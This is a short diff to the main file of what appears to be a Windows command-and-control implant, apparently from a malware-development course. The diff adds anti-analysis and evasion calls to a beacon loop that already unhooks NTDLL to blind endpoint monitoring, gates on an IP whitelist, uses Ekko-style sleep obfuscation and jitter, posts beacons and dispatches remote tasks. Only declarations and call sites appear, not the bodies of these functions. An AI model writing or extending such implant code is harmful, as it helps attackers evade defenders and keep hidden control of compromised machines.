@@ -1,17 +1,12 @@
-// src/main.c
-#include "recon.h"
-#include "comms.h"
-#include "killswitch.h"
-#include <windows.h>
-#include <stdio.h>
 
-extern BOOL  unhook_ntdll();
-extern BOOL  ip_whitelist_gate();
-extern BOOL  checking_connection(BOOL*);
-extern VOID  ekko_sleep(DWORD);
-extern DWORD jitter(DWORD);
-extern BOOL  beacon_post(BYTE*, DWORD, BYTE**, DWORD*);
-extern VOID  dispatch_task(BYTE*, DWORD);
+#include "anti_analysis.h"
+#include "beacon.h"
+#include "comms.h"
+#include "evasion.h"
+#include "killswitch.h"
+#include "recon.h"
+#include <stdio.h>
+#include <windows.h>
 
 VOID beacon_run() {
     printf("[*] beacon_run() starting\n");
@@ -19,6 +14,11 @@ VOID beacon_run() {
     // 1 -- unhook NTDLL (evasion.c, Mod 83/84)
     if (!unhook_ntdll())
         printf("[!] NTDLL unhook failed -- continuing\n");
+    anti_analysis_run();
+    if(!evasion_run())
+    {
+        printf("[!]Evasion failed --continuing\n");
+    }
 
     // 2 -- IP gate (comms.c, Mod 21/73)
     ip_whitelist_gate(); // exits if out of range
